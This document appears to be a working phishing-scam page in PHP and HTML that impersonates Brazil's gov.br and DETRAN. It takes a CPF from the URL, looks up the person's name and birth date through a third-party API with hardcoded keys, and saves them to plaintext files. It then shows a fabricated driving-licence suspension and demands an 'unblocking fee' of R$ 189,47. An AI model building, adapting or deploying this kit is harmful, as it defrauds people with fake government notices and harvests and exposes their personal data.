<?php
// 1. Configurações de Múltiplas Chaves
$apiKeys = [
    "bf88a546cecddb89cc58915bfe6b81951958232765ff1eab5c19f9d1cbd12228", // Chave 0
    "44515e4082b0c7e29c9eed66bf3e5104b304dab5cc40eebc719f114f7dce7f21"  // Chave 7
];
$baseUrl = "https://apicpf.com/api/consulta";

// 2. Captura e limpa o CPF
$cpf = isset($_GET['cpf']) ? preg_replace('/[^0-9]/', '', $_GET['cpf']) : null;

if (!$cpf || strlen($cpf) !== 11) {
    die("CPF inválido ou não fornecido.");
}

// 3. Garante que a pasta 'clientes' existe no diretório atual do script
$pastaClientes = __DIR__ . '/clientes';
if (!file_exists($pastaClientes)) {
    @mkdir($pastaClientes, 0755, true);
}

$arquivoCliente = $pastaClientes . '/' . $cpf . '.txt';

$data = null;
$sucessoNaConsulta = false;
$nome = "ERRO AO LOCALIZAR DADOS TENTE NOVAMENTE";
$nascimento = "--/--/----";

// --- VERIFICA SE O CLIENTE JÁ ESTÁ SALVO NO TXT (Cache local) ---
if (file_exists($arquivoCliente) && filesize($arquivoCliente) > 0) {
    $conteudoTxt = file_get_contents($arquivoCliente);
    $linhas = explode("\n", $conteudoTxt);
    
    foreach ($linhas as $linha) {
        if (stripos($linha, 'NOME:') === 0) {
            $nome = trim(substr($linha, 5));
        }
        if (stripos($linha, 'DATA DE NASCIMENTO:') === 0 || stripos($linha, 'NASCIMENTO:') === 0) {
            $nascimento = trim(substr($linha, strpos($linha, ':') + 1));
        }
    }
    $sucessoNaConsulta = true;
} else {
    // --- SE NÃO ESTÁ SALVO, USA O RODÍZIO DE CHAVES EM SEQUÊNCIA ---
    // Salvando o índice dentro da pasta clientes para funcionar no Render sem erros de diretório temporário
    $indexFile = $pastaClientes . '/rodizio_chaves_estrito_cnh.txt';
    $currentIndex = 0;

    if (file_exists($indexFile)) {
        $currentIndex = (int)file_get_contents($indexFile);
    }

    $totalChaves = count($apiKeys);
    $tentativas = 0;

    // Loop de segurança: se a chave atual falhar, testa a próxima em sequência automaticamente
    while ($tentativas < $totalChaves) {
        $apiKeySelecionada = $apiKeys[$currentIndex];
        
        $proximoIndex = ($currentIndex + 1) % $totalChaves;
        
        $urlFinal = $baseUrl . "?cpf=" . $cpf . "&api_key=" . trim($apiKeySelecionada);

        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $urlFinal,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 12,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTPHEADER => [
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept: application/json, text/javascript, */*; q=0.01',
                'X-Requested-With: XMLHttpRequest'
            ]
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($response && $httpCode === 200) {
            $tempData = json_decode($response, true);
            if (is_array($tempData)) {
                if (isset($tempData['status']) && $tempData['status'] === false) {
                    $currentIndex = $proximoIndex;
                    $tentativas++;
                    continue;
                } else {
                    @file_put_contents($indexFile, $proximoIndex);
                    $data = $tempData;
                    $sucessoNaConsulta = true;
                    break;
                }
            }
        }

        $currentIndex = $proximoIndex;
        $tentativas++;
    }

    // Processa os dados retornados e salva no arquivo TXT do cliente
    if ($sucessoNaConsulta && $data) {
        array_walk_recursive($data, function($valor, $chave) use (&$nome, &$nascimento) {
            $chave = strtolower($chave);
            if ($chave == 'nome' || $chave == 'nome_completo') {
                $nome = $valor;
            }
            if ($chave == 'nascimento' || $chave == 'data_nascimento') {
                if (strpos($valor, '-') !== false) {
                    $partes = explode('-', $valor);
                    $nascimento = (count($partes) == 3) ? $partes[2] . '/' . $partes[1] . '/' . $partes[0] : $valor;
                } else {
                    $nascimento = $valor;
                }
            }
        });

        // SALVA OS DADOS NO TXT EM UM SÓ LUGAR
        $conteudoSalvar = "CPF: " . $cpf . "\n" .
                          "NOME: " . mb_strtoupper($nome) . "\n" .
                          "DATA DE NASCIMENTO: " . $nascimento . "\n";
        
        @file_put_contents($arquivoCliente, $conteudoSalvar);
    }
}
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Regularização De CNH</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { font-family: "Rawline", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background-color: #F8F9FA; color: #333; line-height: 1.4; }
        
        .header { 
            background-color: #004795; 
            padding: 15px 20px; 
            display: flex; 
            align-items: center; 
            justify-content: flex-start; 
            border-bottom: 3px solid #FFCC00; 
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        
        .header img {
            height: 22px;
            width: auto;
            filter: brightness(0) invert(1);
        }

        .container { padding: 20px; max-width: 500px; margin: 0 auto; }

        .user-box { 
            background: white;
            border-radius: 8px;
            padding: 15px;
            border-left: 5px solid #004795; 
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
            margin-bottom: 20px;
            margin-top: 5px;
        }
        .user-name { font-weight: 800; font-size: 1rem; color: #1a1a1a; text-transform: uppercase; margin-bottom: 5px; }
        .user-info { font-size: 0.85rem; color: #666; }

        .status-badge { 
            background-color: #FFF5F5; 
            border: 1px solid #FEB2B2; 
            border-radius: 12px; 
            padding: 18px; 
            margin-bottom: 20px; 
        }
        .status-title { color: #C53030; font-weight: 800; font-size: 0.95rem; display: flex; align-items: center; margin-bottom: 10px; }
        .status-text { font-size: 0.88rem; color: #4A5568; }

        .details-section { background: white; border-radius: 12px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
        .details-item { padding: 12px 0; border-bottom: 1px solid #EDF2F7; }
        .details-item:last-child { border-bottom: none; }
        .details-label { font-size: 0.7rem; color: #718096; text-transform: uppercase; font-weight: 700; letter-spacing: 0.5px; }
        .details-value { font-size: 0.95rem; font-weight: 600; color: #2D3748; margin-top: 3px; }
        .text-danger { color: #E53E3E; }

        .notice-card {
            margin-top: 20px;
            background: linear-gradient(135deg, #FFFAF0 0%, #FEFCBF 100%);
            border: 1px solid #F6AD55;
            border-left: 6px solid #DD6B20;
            border-radius: 10px;
            padding: 16px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
        }
        .notice-header {
            display: flex;
            align-items: center;
            font-size: 0.85rem;
            font-weight: 800;
            color: #C05621;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 8px;
        }
        .notice-body {
            font-size: 0.88rem;
            color: #4A5568;
            line-height: 1.5;
        }
        .notice-highlight {
            display: block;
            margin-top: 10px;
            padding: 10px 12px;
            background-color: #FFFFFF;
            border-radius: 6px;
            border: 1px dashed #DD6B20;
            text-align: center;
            font-size: 0.95rem;
            color: #2D3748;
        }
        .notice-price {
            font-size: 1.2rem;
            font-weight: 800;
            color: #C53030;
        }

        .footer-action { 
            position: fixed; 
            bottom: 0; 
            left: 0; 
            width: 100%; 
            background: white; 
            padding: 15px 20px 30px; 
            box-shadow: 0 -4px 10px rgba(0,0,0,0.05); 
        }
        .btn-gov { 
            display: block; 
            background-color: #1351b4; 
            color: white; 
            text-align: center; 
            padding: 16px; 
            border-radius: 8px; 
            text-decoration: none; 
            font-weight: 700; 
            font-size: 0.95rem;
        }

        .spacer { height: 140px; }
    </style>
</head>
<body>

<div class="header">
    <img src="./gov.br - Acesse sua conta_files/govbr.png" class="gov-logo" alt="Gov.br">
</div>

<div class="container">
    <div class="user-box">
        <div class="user-name"><?php echo mb_strtoupper($nome); ?></div>
        <div class="user-info">Nascimento: <strong><?php echo $nascimento; ?></strong></div>
        <div class="user-info">Prontuário: Digital RENACH</div>
    </div>

    <div class="status-badge">
        <div class="status-title">⚠️ SITUAÇÃO: BLOQUEIO ATIVO</div>
        <div class="status-text">
            Constam pendências administrativas em seu registro que podem acarretar na suspensão definitiva do direito de dirigir.
        </div>
    </div>

    <div class="details-section">
        <div class="details-item">
            <div class="details-label">Status da Carteira</div>
            <div class="details-value text-danger">Impedimento de Renovação</div>
        </div>
        <div class="details-item">
            <div class="details-label">Infração Base</div>
            <div class="details-value">Art. 261 - Suspensão do Direito de Dirigir</div>
        </div>
        <div class="details-item">
            <div class="details-label">Órgão Emissor</div>
            <div class="details-value">DETRAN - Base Nacional</div>
        </div>
    </div>

    <div class="notice-card">
        <div class="notice-header">
            📢 AVISO DE REGULARIZAÇÃO
        </div>
        <div class="notice-body">
            Para realizar a liberação da sua CNH e evitar a suspensão imediata da sua CNH, emita e efetue a quitação da taxa administrativa de regularização.
            <div class="notice-highlight">
                Taxa Obrigatória de Desbloqueio: <br>
                <span class="notice-price">R$ 189,47</span>
            </div>
        </div>
    </div>

    <div class="spacer"></div>
</div>

<div class="footer-action">
    <a href="sucesso.php" class="btn-gov">REGULARIZAR AGORA</a>
    <p style="text-align: center; font-size: 10px; color: #A0AEC0; margin-top: 12px; font-weight: 500;">
        © 2026 Ministério da Infraestrutura - SENATRAN
    </p>
</div>

</body>
</html>
